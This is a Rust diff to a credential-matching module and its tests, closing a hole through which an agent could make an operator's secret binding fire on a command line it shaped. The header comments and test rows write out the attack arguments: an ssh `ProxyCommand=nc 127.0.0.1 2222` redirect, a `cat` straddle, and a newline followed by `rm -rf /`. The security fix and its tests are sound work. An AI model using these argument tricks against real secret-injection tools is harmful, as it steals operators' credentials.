@@ -52,29 +52,72 @@
 //! watch. The other subject — the prompt line — is the child's own output
 //! and is influenced only through what the child prints.
 //!
-//! **The consequence, which the un-quoted join below makes sharper: the
-//! agent controls both sides of a word-boundary straddle.** An operator
-//! writing an **unanchored** `match_command` is writing a pattern the
-//! agent can satisfy from an argument. `match_command = "ssh\\s+prod-01"`
-//! is matched by `start_session(command: "cat", args: ["x", "ssh prod-01
-//! y"])`, whose joined line is `cat x ssh prod-01 y` — and the credential
-//! is then typed into `cat`, which echoes it into the ring buffer and out
-//! through `read_output`. §9.6's published example is anchored
-//! (`^ssh\s+(\S+@)?prod-0[12]\b`) and is safe; nothing in this code, in
-//! `Config::validate`, or in §10.2 says why the anchor matters. **Anchor
-//! your patterns.**
+//! ## `match_command` must cover the **whole** joined line (GH #45)
 //!
-//! In the same class: **`match_command = ""` is config-legal and matches
-//! everything.** `Config::validate` compiles both patterns and
-//! deliberately does not special-case the empty one; the empty regex
-//! matches every subject, so an empty `match_command` is a credential
-//! store handed to every session on the box — from a two-character config
-//! value. Unlike `match_prompt`, whose empty spelling §9.6 gives a meaning
-//! (*"does not select on the prompt"*), the empty `match_command` has no
-//! documented meaning to apply, so this module implements it literally and
-//! `an_empty_match_command_matches_every_session` pins that it is literal.
-//! Rejecting it belongs at load, in `config.rs`, which this task does not
-//! own.
+//! Through 0.0.7 this module matched with `Regex::is_match`, which is
+//! unanchored at both ends, so an operator's pattern constrained only a
+//! *prefix* of a string the agent writes in full. **§9.6's own published
+//! example was exploitable exactly as published**:
+//! `^ssh\s+(\S+@)?prod-0[12]\b` is matched by
+//!
+//! ```text
+//! start_session("ssh", ["prod-01", "-o", "ProxyCommand=nc 127.0.0.1 2222"])
+//! ```
+//!
+//! — the operator's binding fires, and the credential is typed into an
+//! `ssh` whose transport the agent has pointed at its own endpoint. That
+//! was driven end to end against a real daemon rather than inferred: the
+//! call returned `secret_provided`, the audit trail named the binding, and
+//! `read_output` handed back the prompt and the value. [`whole_line`] is
+//! the repair — the pattern is compiled inside `\A(?:…)\z`, so an argument
+//! the pattern never examined is now an argument that stops it matching.
+//!
+//! **Anchoring alone would have been the wrong shape of fix, and its
+//! second half lives in `config.rs`.** The first operator whose
+//! legitimate session stops matching appends `.*` under time pressure,
+//! silently, and the hole is back — so `Config::validate` refuses a
+//! `match_command` that ends in an unconstrained tail. See
+//! `refuses_an_unconstrained_tail` there for why that check is a
+//! deliberately shallow heuristic and must stay one.
+//!
+//! Two live holes this header could previously only warn about are closed
+//! by the same line, and both are pinned by rows below. **The
+//! word-boundary straddle**: `match_command = "ssh\\s+prod-01"` used to be
+//! satisfied by `start_session("cat", ["x", "ssh prod-01 y"])`, whose
+//! joined line is `cat x ssh prod-01 y`, so the credential went to `cat`,
+//! which echoed it straight into the ring buffer. It no longer matches,
+//! because the pattern reaches neither end. And **`match_command = ""`**,
+//! which is still config-legal and still read literally, now matches only
+//! the empty subject — and a session's command line always has a command
+//! in it.
+//!
+//! **`match_prompt` is deliberately *not* anchored.** Its subject is the
+//! child's own output rather than the agent's argument list, and an
+//! operator's `(?i)password` is meant to find a word inside a line like
+//! `ada@prod-01's password: `. Anchoring it would break every prompt
+//! pattern §9.6 publishes and close nothing.
+//!
+//! ## What this still does not close
+//!
+//! **The un-quoted join means one straddle survives**, in the one
+//! direction the whole-line rule cannot see: `command` and `args` are
+//! joined before matching, so `start_session("ssh prod-01", [])` produces
+//! the same subject as `start_session("ssh", ["prod-01"])`. An agent that
+//! can write a file whose *name* contains a space can therefore satisfy
+//! an operator's whole-line pattern with a program of its own. Quoting
+//! the join would close it and is not this fix: §9.6's model is a regex
+//! over a command line, and a quoting scheme operators would have to
+//! guess at trades one hazard for another. GH #46's operator-declared
+//! session profiles — where the agent fills slots and never writes a
+//! command line at all — retire the whole class.
+//!
+//! **And the credential's *effect* is not protected, only its bytes.** An
+//! agent that can start `ssh prod-01` at all still ends up with an
+//! interactive shell on the target once injection succeeds. What the
+//! whole-line rule and the tail check stop is theft of the **value**, for
+//! reuse elsewhere and beyond this session's lifetime, which is why byte
+//! theft was the thing closed first. Nothing here should be read as more
+//! than that.
 //!
 //! ## The two subjects
 //!
@@ -195,16 +238,15 @@ pub fn select<'a>(
 /// One binding against one session's two subjects.
 fn matches(binding: &SecretBinding, command_line: &str, prompt_line: &str) -> bool {
     // **The subject here is agent-authored** — see the module header — so
-    // an empty or unanchored pattern is one the agent can satisfy. Read
-    // literally either way: unlike `match_prompt`, §9.6 gives the empty
-    // `match_command` no meaning to apply, and inventing one here would be
-    // a second place an operator's pattern means something other than what
-    // a regex engine says it means. `an_empty_match_command_matches_every_session`
-    // pins that it is literal, and says where the fix belongs.
+    // it is matched **whole** (GH #45). A pattern that constrains only a
+    // prefix constrains only the part of the line the agent chose to leave
+    // alone, which is what let `ssh prod-01 -o ProxyCommand=…` select an
+    // operator's binding. The empty pattern is still read literally, and
+    // under this rule it selects nothing a session can be.
     if !pattern_matches(
         binding,
         "match_command",
-        &binding.match_command,
+        &whole_line(&binding.match_command),
         command_line,
     ) {
         return false;
@@ -224,6 +266,33 @@ fn matches(binding: &SecretBinding, command_line: &str, prompt_line: &str) -> bo
     pattern_matches(binding, "match_prompt", &binding.match_prompt, prompt_line)
 }
 
+/// An operator's `match_command`, rewritten so it must cover the **whole**
+/// joined command line (GH #45).
+///
+/// **`\A` and `\z` rather than `^` and `$`**, and that is the difference
+/// between a fix and the appearance of one. In this crate's `regex`, `^`
+/// and `$` become *line* anchors under an inline `(?m)`, and the pattern
+/// being wrapped is the operator's — it may carry any flag it likes. `\A`
+/// and `\z` are absolute whatever is set inside the group, so an argument
+/// carrying a newline cannot buy back the prefix match this function
+/// exists to take away. `\z` and not `\Z` for the same reason: `\Z` would
+/// let a trailing newline through.
+///
+/// **Wrapped in `(?:…)`**, so an operator's top-level alternation keeps
+/// its meaning: `a|b` anchored as `\Aa|b\z` is *"`a` at the start, or `b`
+/// at the end"*, which is neither of the two things they wrote.
+///
+/// The operator's own `^` and `$` are left in place and remain correct —
+/// they are simply redundant now, which is why §9.6's published example
+/// still reads naturally after the change.
+///
+/// **No `(?s)` is added.** Turning `.` into "any byte including newline"
+/// would *widen* every pattern an operator wrote, in the one direction
+/// this change exists to narrow.
+fn whole_line(pattern: &str) -> String {
+    format!(r"\A(?:{pattern})\z")
+}
+
 /// Compile and apply one of a binding's two patterns.
 ///
 /// **A pattern that will not compile is not a match**, and it says so in
@@ -232,6 +301,14 @@ fn matches(binding: &SecretBinding, command_line: &str, prompt_line: &str) -> bo
 /// Rust can. The alternative — panicking, or treating an uncompilable
 /// pattern as a match — would turn a config-shaped mistake into either a
 /// dead daemon or a binding that fires on everything.
+///
+/// For `match_command` the `pattern` handed here is [`whole_line`]'s
+/// rewrite rather than the operator's source, so the `regex` error in the
+/// diagnostic quotes the wrapped form. That is worth one confusing pair of
+/// delimiters in a line an operator sees only for a config
+/// `Config::validate` would already have refused: compiling the raw source
+/// for the message and the wrapped one for the match would be two compiles
+/// that could disagree.
 ///
 /// The compile happens per call rather than once at load. Bindings are few
 /// and a secret request is not a hot path; caching them would mean a
@@ -650,6 +727,22 @@ mod tests {
     /// would otherwise be satisfied by the redactor rather than by this
     /// module.
     const REFERENCE: &str = "op://vault/prod-db-refcanary/password";
+
+    /// The `match_command` almost every row below carries, for a session
+    /// recorded as `ssh prod-01` (or `prod-02`).
+    ///
+    /// **It was `^ssh\b` until GH #45**, which matched because matching
+    /// was a prefix test. Under the whole-line rule that pattern selects
+    /// only a session whose entire command line is the four bytes `ssh`,
+    /// so every row that used it went red at once — which is the fixture
+    /// churn the fix was expected to cause and the reason this is one
+    /// constant rather than forty-odd literals.
+    ///
+    /// **`$` and not `.*`.** Appending a permissive tail is the exact
+    /// workaround `Config::validate` now refuses in an operator's config,
+    /// and reaching for it here to make a suite green would be this
+    /// project's own tests modelling the defect.
+    const SSH_PROD: &str = "^ssh\\s+prod-0[12]$";
 
     /// The one echo-off fixture (Global Constraint 14), **and a row below
     /// that asserts this copy is the same one**.
@@ -1106,11 +1199,11 @@ mod tests {
     /// readings and only one of them is right.
     #[test]
     fn an_empty_prompt_line_never_satisfies_a_match_prompt() {
-        let mut with_prompt = plain_binding("p", "^ssh\\b");
+        let mut with_prompt = plain_binding("p", SSH_PROD);
         with_prompt.match_prompt = "(?i)password".to_string();
-        let mut anything = plain_binding("a", "^ssh\\b");
+        let mut anything = plain_binding("a", SSH_PROD);
         anything.match_prompt = ".*".to_string();
-        let no_prompt = plain_binding("n", "^ssh\\b");
+        let no_prompt = plain_binding("n", SSH_PROD);
 
         let set = [with_prompt.clone(), anything.clone(), no_prompt.clone()];
         // A binding with **no** `match_prompt` selects on the command
@@ -1142,69 +1235,158 @@ mod tests {
         );
     }
 
-    /// **`match_command = ""` matches every session, and an unanchored one
-    /// is satisfiable from an agent-supplied argument.**
+    /// **GH #45, at the matcher.** The agent shapes a command line that
+    /// satisfies §9.6's *published* pattern and redirects the client's
+    /// transport to itself; it must not select the operator's binding.
     ///
-    /// The empty-`match_prompt` rule has three rows; this is its missing
-    /// sibling. Both cases are *literal regex behaviour* rather than
-    /// implementation choices, and the row exists so that the behaviour is
-    /// written down rather than discovered by an operator: an empty
-    /// `match_command` loads (`Config::validate` compiles both patterns and
-    /// deliberately does not special-case the empty one) and hands the
-    /// credential store to every session on the box.
+    /// This is the issue's own reproduction, verbatim, and the pattern is
+    /// not a straw man — it is the one §9.6 published, unchanged, at the
+    /// moment the issue was filed. §9.6 now publishes `…prod-0[12]$`
+    /// instead, and this row deliberately keeps the **old** spelling: the
+    /// claim worth making is that the exploit is dead even for the
+    /// pattern that shipped, not merely that it is dead for a pattern
+    /// rewritten afterwards. Against it the agent called
     ///
-    /// The second half is the straddle the module header describes, driven:
-    /// with an unanchored operator pattern, an agent that never runs `ssh`
-    /// at all can still produce a joined command line that matches, by
-    /// putting a space inside one argument. That is why §9.6's published
-    /// example is anchored.
+    /// ```text
+    /// start_session("ssh", ["prod-01",
+    ///                       "-o", "StrictHostKeyChecking=no",
+    ///                       "-o", "UserKnownHostsFile=/dev/null",
+    ///                       "-o", "ProxyCommand=nc 127.0.0.1 2222"])
+    /// ```
     ///
-    /// **Neither is a defect in this module and the fix for both is at
-    /// load, in `config.rs`, which this task does not own.** The row is
-    /// here so the next person to open that file finds the case stated as
-    /// a fact rather than as a worry.
+    /// and, before the fix, got `secret_provided`, an audit line naming
+    /// the binding, and the operator's credential back out of
+    /// `read_output`.
+    ///
+    /// **The pairing is not optional here and is the reason the two halves
+    /// are one row.** An anchoring bug that matches *nothing* satisfies
+    /// every hostile line in the loop below and is a worse implementation
+    /// than the one being fixed — so each hostile line is asserted beside
+    /// the legitimate session the same operator wrote the binding for.
     #[test]
-    fn an_empty_match_command_matches_every_session() {
+    fn an_agent_cannot_append_arguments_to_reach_an_operators_binding() {
+        // §9.6's published pattern, character for character.
+        let operators = plain_binding("prod-ssh", "^ssh\\s+(\\S+@)?prod-0[12]\\b");
+        let one = std::slice::from_ref(&operators);
+
+        // The legitimate sessions. **First**, so a matcher that answers
+        // `None` to everything fails here rather than passing below.
+        for (command, args) in [
+            ("ssh", vec!["prod-01"]),
+            ("ssh", vec!["user@prod-01"]),
+            ("ssh", vec!["prod-02"]),
+        ] {
+            let line = command_line(
+                command,
+                &args.iter().map(|a| a.to_string()).collect::<Vec<_>>(),
+            );
+            assert_eq!(
+                select(one, &line, "").map(|b| b.name.as_str()),
+                Some("prod-ssh"),
+                "the operator's own session stopped matching: {line:?}"
+            );
+        }
+
+        // The issue's argv, and the same trick in the shapes a reviewer
+        // would reach for next: the payload before the flags, a `-o` that
+        // is not the last word, and the `ProxyCommand=` value carrying the
+        // spaces that made the un-quoted join interesting in the first
+        // place.
+        for args in [
+            vec![
+                "prod-01",
+                "-o",
+                "StrictHostKeyChecking=no",
+                "-o",
+                "UserKnownHostsFile=/dev/null",
+                "-o",
+                "ProxyCommand=nc 127.0.0.1 2222",
+            ],
+            vec!["prod-01", "-o", "ProxyCommand=nc 127.0.0.1 2222"],
+            vec!["prod-01", "-o", "ProxyCommand=nc 127.0.0.1 2222", "-v"],
+            vec!["prod-01", "-tt", "cat"],
+            // A newline in an argument, which is what would buy the prefix
+            // match back if `whole_line` had reached for `^`/`$` instead
+            // of `\A`/`\z`.
+            vec!["prod-01\nrm -rf /"],
+        ] {
+            let line = command_line(
+                "ssh",
+                &args.iter().map(|a| a.to_string()).collect::<Vec<_>>(),
+            );
+            assert_eq!(
+                select(one, &line, ""),
+                None,
+                "an agent-appended tail selected the operator's binding, and the \
+                 credential is typed into a client whose transport the agent chose: \
+                 {line:?}"
+            );
+        }
+    }
+
+    /// The two patterns the whole-line rule turns from live holes into
+    /// nothing, driven.
+    ///
+    /// **This row asserted the opposite until GH #45** — it was
+    /// `an_empty_match_command_matches_every_session`, and it existed to
+    /// write down two hazards this module could then only warn about. Both
+    /// are now closed by the same line, so the row is kept and inverted
+    /// rather than deleted: the cases are still the ones worth stating,
+    /// and a reader who greps for the old name should find where it went.
+    ///
+    /// 1. **`match_command = ""`.** Still config-legal, still read
+    ///    literally, and the empty regex now matches only the empty
+    ///    subject — which a session's command line never is, because it
+    ///    always has a command in it. Rejecting it at load is therefore no
+    ///    longer load-bearing and is not done.
+    /// 2. **The word-boundary straddle.** An unanchored operator pattern
+    ///    used to be satisfiable by an agent that never ran the command at
+    ///    all, from a space inside one argument.
+    #[test]
+    fn neither_an_empty_nor_a_partial_match_command_selects_a_real_session() {
         let everything = plain_binding("open", "");
         for line in [
             "ssh prod-01",
             "psql -h staging",
             "bash",
-            "",
             "some-utterly-unrelated-command --flag",
         ] {
             assert_eq!(
-                select(std::slice::from_ref(&everything), line, "").map(|b| b.name.as_str()),
-                Some("open"),
-                "an empty match_command must be read literally, and the empty regex \
-                 matches {line:?}"
+                select(std::slice::from_ref(&everything), line, ""),
+                None,
+                "an empty match_command is still read literally, and the empty regex \
+                 does not cover {line:?} end to end"
             );
         }
-        // The pairing: a non-empty pattern still discriminates, so the row
-        // above is not satisfied by a `select` that answers `Some` always.
-        let narrow = plain_binding("narrow", "^ssh\\b");
+        // Read **literally**, not special-cased: the one subject the empty
+        // regex does cover is the empty one. Without this line the row
+        // above is equally true of a matcher that special-cases `""` to
+        // `false`, which would be a second place an operator's pattern
+        // means something other than what a regex engine says it means.
+        assert!(select(std::slice::from_ref(&everything), "", "").is_some());
+
+        // The pairing: a non-empty pattern still selects, so the rows above
+        // are not satisfied by a `select` that answers `None` always.
+        let narrow = plain_binding("narrow", SSH_PROD);
         assert!(select(std::slice::from_ref(&narrow), "ssh prod-01", "").is_some());
         assert!(select(std::slice::from_ref(&narrow), "psql -h staging", "").is_none());
 
-        // The straddle, driven. The operator's pattern is unanchored and
-        // the agent never runs `ssh`.
-        let unanchored = plain_binding("unanchored", "ssh\\s+prod-01");
+        // The straddle. The operator's pattern reaches neither end of the
+        // line the agent built, so it no longer matches — and the agent
+        // here never runs `ssh` at all.
+        let partial = plain_binding("partial", "ssh\\s+prod-01");
         let agent_line = command_line("cat", &["x".to_string(), "ssh prod-01 y".to_string()]);
         assert_eq!(agent_line, "cat x ssh prod-01 y");
-        assert!(
-            select(std::slice::from_ref(&unanchored), &agent_line, "").is_some(),
-            "the un-quoted join lets an argument straddle a word boundary, and both \
-             sides of that are agent-controlled"
+        assert_eq!(
+            select(std::slice::from_ref(&partial), &agent_line, ""),
+            None,
+            "an argument straddled a word boundary and reached the operator's binding"
         );
-        // Anchored — §9.6's own spelling — and the same line no longer
-        // matches. This is the pairing that makes the sentence in the
-        // module header actionable rather than merely alarming.
-        let anchored = plain_binding("anchored", "^ssh\\s+(\\S+@)?prod-0[12]\\b");
-        assert!(
-            select(std::slice::from_ref(&anchored), &agent_line, "").is_none(),
-            "anchoring is what closes the straddle"
-        );
-        assert!(select(std::slice::from_ref(&anchored), "ssh user@prod-01", "").is_some());
+        // And the pairing for *that*: the same partial pattern still
+        // selects the line it does cover whole, so the assertion above is
+        // about where the pattern reaches and not about the pattern being
+        // rejected outright.
+        assert!(select(std::slice::from_ref(&partial), "ssh prod-01", "").is_some());
     }
 
     /// A pattern that cannot compile is not a match, and does not panic.
@@ -1217,7 +1399,7 @@ mod tests {
     fn an_uncompilable_pattern_matches_nothing() {
         let mut bad = plain_binding("bad", "^ssh(");
         assert_eq!(select(std::slice::from_ref(&bad), "ssh prod-01", "x"), None);
-        bad.match_command = "^ssh".into();
+        bad.match_command = SSH_PROD.into();
         bad.match_prompt = "(?P<".into();
         assert_eq!(select(std::slice::from_ref(&bad), "ssh prod-01", "x"), None);
         // The pairing, or the row above passes against a `select` that
@@ -1315,6 +1497,76 @@ mod tests {
         let _ = s.signal(Signal::Kill);
     }
 
+    /// **GH #45, end to end.** The issue's reproduction, driven through
+    /// the same tool call the agent used against a real daemon.
+    ///
+    /// `an_agent_cannot_append_arguments_to_reach_an_operators_binding`
+    /// is the unit half and would stay green against a daemon that never
+    /// consulted the matcher at all. This one runs `request_secret_input`
+    /// on a **live PTY** with §9.6's published pattern and the issue's
+    /// argv, and asserts the three things the issue observed going the
+    /// other way: no provider process, no `binding_resolved`, and a call
+    /// that fell through to the human prompt.
+    ///
+    /// Its pairing is `a_binding_matches_the_sessions_own_command_line`,
+    /// two rows up — the same binding, the same provider script, and a
+    /// session the operator meant, which resolves.
+    #[tokio::test]
+    async fn an_appended_proxy_command_reaches_no_provider() {
+        let mut sc = Scratch::new("gh45");
+        let b = sc.binding(
+            "prod-ssh",
+            "^ssh\\s+(\\S+@)?prod-0[12]\\b",
+            &format!("printf '{PROBE}\\n'\n"),
+        );
+        let server = server_with(keychain_mode(vec![b]), &sc.audit_log());
+        // The issue's `start_session` call, verbatim. The child is the
+        // echo-off fixture rather than a real `ssh` (no test may run one),
+        // which is exactly the arrangement every other row here uses: §9.4
+        // records what `start_session` was called with, and that recorded
+        // line is what `match_command` sees.
+        let s = session_running(
+            "ssh",
+            &[
+                "prod-01",
+                "-o",
+                "StrictHostKeyChecking=no",
+                "-o",
+                "UserKnownHostsFile=/dev/null",
+                "-o",
+                "ProxyCommand=nc 127.0.0.1 2222",
+            ],
+            ECHO_OFF_FIXTURE,
+        );
+        server.registry.insert(Arc::clone(&s)).expect("register");
+        await_prompt(&s, b"Password: ").await;
+
+        let payload = call(&server, secret_args(&s.id, 1)).await;
+
+        assert!(
+            !sc.ran("prod-ssh"),
+            "the operator's provider ran for a command line the agent shaped to \
+             redirect the client's transport at itself"
+        );
+        fell_through_to_the_prompt(&payload, &sc, &s.id);
+        // The issue's own observation, inverted: `read_output` returned
+        // the prompt *and the value*. Nothing was written, so the child
+        // never transformed anything.
+        let seen = buffered(&s);
+        assert!(
+            !contains(&seen, b"got="),
+            "the child was given something: {}",
+            String::from_utf8_lossy(&seen)
+        );
+        assert!(
+            !contains(&seen, PROBE.as_bytes()),
+            "the operator's credential reached the ring buffer, which is where the \
+             issue read it back out of"
+        );
+
+        let _ = s.signal(Signal::Kill);
+    }
+
     /// **REQ-SEC-012, adversarial.** The agent names a secret in
     /// `prompt_text` and it reaches no lookup.
     ///
@@ -1383,7 +1635,7 @@ mod tests {
         let prompt = format!("password for {TOKEN}: ");
 
         let mut sc = Scratch::new("unredacted");
-        let mut b = sc.binding("gh", "^git\\b", &format!("printf '{PROBE}\\n'\n"));
+        let mut b = sc.binding("gh", "^git\\s+push$", &format!("printf '{PROBE}\\n'\n"));
         b.match_prompt = "(?i)password for ghp_".to_string();
         let server = server_with(keychain_mode(vec![b]), &sc.audit_log());
 
@@ -1427,9 +1679,9 @@ mod tests {
     #[tokio::test]
     async fn the_first_matching_binding_in_order_wins() {
         let mut sc = Scratch::new("order");
-        let mut first = sc.binding("zeta", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
+        let mut first = sc.binding("zeta", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
         first.provider = "pass".into();
-        let mut second = sc.binding("alpha", "^ssh\\b", "printf 'wrong-one\\n'\n");
+        let mut second = sc.binding("alpha", SSH_PROD, "printf 'wrong-one\\n'\n");
         second.provider = "onepassword".into();
         let server = server_with(keychain_mode(vec![first, second]), &sc.audit_log());
 
@@ -1476,7 +1728,7 @@ mod tests {
     #[tokio::test]
     async fn max_uses_is_per_session_and_bounded() {
         let mut sc = Scratch::new("maxuses");
-        let mut b = sc.binding("prod-ssh", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
+        let mut b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
         b.max_uses = Some(2);
         let server = server_with(keychain_mode(vec![b]), &sc.audit_log());
 
@@ -1574,7 +1826,7 @@ mod tests {
     #[tokio::test]
     async fn the_default_provider_mode_never_spawns_a_provider() {
         let mut sc = Scratch::new("defaultmode");
-        let b = sc.binding("prod-ssh", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
+        let b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
         // Everything about this config is the resolving one **except** the
         // mode, which is left at its default.
         let security = SecurityConfig {
@@ -1605,7 +1857,7 @@ mod tests {
         // *does* resolve. Without it this row passes against a matcher
         // that never matches and a fixture that could never run.
         let mut sc2 = Scratch::new("defaultmode-control");
-        let b2 = sc2.binding("prod-ssh", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
+        let b2 = sc2.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
         let server2 = server_with(keychain_mode(vec![b2]), &sc2.audit_log());
         let s2 = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
         server2.registry.insert(Arc::clone(&s2)).expect("register");
@@ -1645,7 +1897,7 @@ mod tests {
     #[tokio::test]
     async fn a_binding_requiring_confirmation_does_not_resolve_yet() {
         let mut sc = Scratch::new("confirm");
-        let mut b = sc.binding("prod-ssh", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
+        let mut b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
         b.require_confirm = true;
         let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());
         let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
@@ -1665,7 +1917,7 @@ mod tests {
         );
 
         let mut sc2 = Scratch::new("confirm-control");
-        let mut cleared = sc2.binding("prod-ssh", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
+        let mut cleared = sc2.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
         cleared.require_confirm = false;
         let server2 = server_with(keychain_mode(vec![cleared]), &sc2.audit_log());
         let s2 = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
@@ -1712,7 +1964,7 @@ mod tests {
         let gate = sc.path("gate");
         let b = sc.binding(
             "slot",
-            "^ssh\\b",
+            SSH_PROD,
             &format!(
                 "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                 gate.display()
@@ -1788,7 +2040,7 @@ mod tests {
         let gate2 = sc2.path("gate");
         let b2 = sc2.binding(
             "slot",
-            "^ssh\\b",
+            SSH_PROD,
             &format!(
                 "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                 gate2.display()
@@ -1853,7 +2105,7 @@ mod tests {
         let gate = sc.path("gate");
         let b = sc.binding(
             "slot",
-            "^ssh\\b",
+            SSH_PROD,
             &format!(
                 "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                 gate.display()
@@ -1935,7 +2187,7 @@ mod tests {
         let gate2 = sc2.path("gate");
         let b2 = sc2.binding(
             "slot",
-            "^ssh\\b",
+            SSH_PROD,
             &format!(
                 "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                 gate2.display()
@@ -2012,7 +2264,7 @@ mod tests {
         let gate = sc.path("gate");
         let b = sc.binding(
             "slot",
-            "^ssh\\b",
+            SSH_PROD,
             &format!(
                 "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                 gate.display()
@@ -2096,7 +2348,7 @@ mod tests {
         let gate2 = sc2.path("gate");
         let b2 = sc2.binding(
             "slot",
-            "^ssh\\b",
+            SSH_PROD,
             &format!(
                 "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                 gate2.display()
@@ -2146,7 +2398,7 @@ mod tests {
     #[test]
     fn every_fall_through_reason_is_reachable() {
         let mut sc = Scratch::new("reasons");
-        let failing = sc.binding("fails", "^ssh\\b", "exit 3\n");
+        let failing = sc.binding("fails", SSH_PROD, "exit 3\n");
         let server = server_with(keychain_mode(vec![failing.clone()]), &sc.audit_log());
         let audit = &server.processor.audit;
         let s = session_running("ssh", &["prod-01"], "sleep 30");
@@ -2160,7 +2412,7 @@ mod tests {
             FellThrough::ModeIsPrompt
         );
 
-        let no_match = keychain_mode(vec![plain_binding("nope", "^psql\\b")]);
+        let no_match = keychain_mode(vec![plain_binding("nope", "^psql\\s+-h\\s+prod$")]);
         assert_eq!(
             autofill_reason(&no_match, &s, audit),
             FellThrough::NoBindingMatched
@@ -2237,7 +2489,7 @@ mod tests {
     #[tokio::test]
     async fn binding_resolved_records_the_name_and_never_the_reference() {
         let mut sc = Scratch::new("auditrow");
-        let b = sc.binding("prod-ssh", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
+        let b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
         let server = server_with(keychain_mode(vec![b]), &sc.audit_log());
         let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
         server.registry.insert(Arc::clone(&s)).expect("register");
@@ -2314,7 +2566,7 @@ mod tests {
         let mut sc = Scratch::new("failaudit");
         let b = sc.binding(
             "prod-ssh",
-            "^ssh\\b",
+            SSH_PROD,
             &format!("echo '{STDERR_CANARY}' >&2\nexit 2\n"),
         );
         let server = server_with(keychain_mode(vec![b]), &sc.audit_log());
@@ -2658,7 +2910,7 @@ mod tests {
     #[test]
     fn an_approval_resolves_only_the_binding_whose_name_was_approved() {
         let mut sc = Scratch::new("approvedname");
-        let b = sc.binding("prod-ssh", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
+        let b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
         let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());
         let audit = &server.processor.audit;
         let s = session_running("ssh", &["prod-01"], "sleep 30");
@@ -2814,7 +3066,7 @@ mod tests {
     #[tokio::test]
     async fn the_approval_surface_carries_no_reference_and_no_value() {
         let mut sc = Scratch::new("surface");
-        let b = confirming(&mut sc, "prod-ssh", "^ssh\\b");
+        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
         let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());
         let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
         server.registry.insert(Arc::clone(&s)).expect("register");
@@ -2954,7 +3206,7 @@ mod tests {
         // interpreter is not what Holdfast chose.
         let mut b = sc.binding(
             "prod-ssh",
-            "^ssh\\b",
+            SSH_PROD,
             &format!(
                 "{{ printf 'argv:%s\\n' \"$0\" \"$@\"; env; echo '--invocation-end--'; }} \
                  >> '{}'\nprintf '{PROBE}\\n'\n",
@@ -3145,7 +3397,7 @@ mod tests {
     #[tokio::test]
     async fn denying_falls_through_to_the_human_prompt() {
         let mut sc = Scratch::new("deny");
-        let b = confirming(&mut sc, "prod-ssh", "^ssh\\b");
+        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
         let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());
         let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
         server.registry.insert(Arc::clone(&s)).expect("register");
@@ -3208,7 +3460,7 @@ mod tests {
     #[tokio::test]
     async fn an_expired_approval_falls_through_the_same_way() {
         let mut sc = Scratch::new("expire");
-        let b = confirming(&mut sc, "prod-ssh", "^ssh\\b");
+        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
         let clock = Clock::manual(std::time::Instant::now());
         let server = server_full(
             keychain_mode(vec![b.clone()]),
@@ -3286,7 +3538,7 @@ mod tests {
     #[tokio::test]
     async fn the_shipped_defaults_still_leave_room_for_the_fall_through() {
         let mut sc = Scratch::new("defaultexpire");
-        let b = confirming(&mut sc, "prod-ssh", "^ssh\\b");
+        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
         let clock = Clock::manual(std::time::Instant::now());
         let configured = DaemonConfig::default().binding_approval_timeout_secs;
         let server = server_full(
@@ -3382,7 +3634,7 @@ mod tests {
     #[tokio::test]
     async fn the_approval_window_leaves_time_for_the_fall_through() {
         let mut sc = Scratch::new("window");
-        let b = confirming(&mut sc, "prod-ssh", "^ssh\\b");
+        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
         let clock = Clock::manual(std::time::Instant::now());
         let server = server_full(
             keychain_mode(vec![b.clone()]),
@@ -3490,7 +3742,7 @@ mod tests {
     #[tokio::test]
     async fn an_approval_taken_away_without_a_decision_falls_through_rather_than_panicking() {
         let mut sc = Scratch::new("discarded");
-        let b = confirming(&mut sc, "prod-ssh", "^ssh\\b");
+        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
         let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());
         // **A child that reads twice, and the liveness assertion below is
         // why.** With one read the human's answer *completes* the child,
@@ -3612,7 +3864,7 @@ mod tests {
     #[tokio::test]
     async fn an_exit_that_races_the_supersede_answers_the_same_way() {
         let mut sc = Scratch::new("exitrace");
-        let b = confirming(&mut sc, "prod-ssh", "^ssh\\b");
+        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
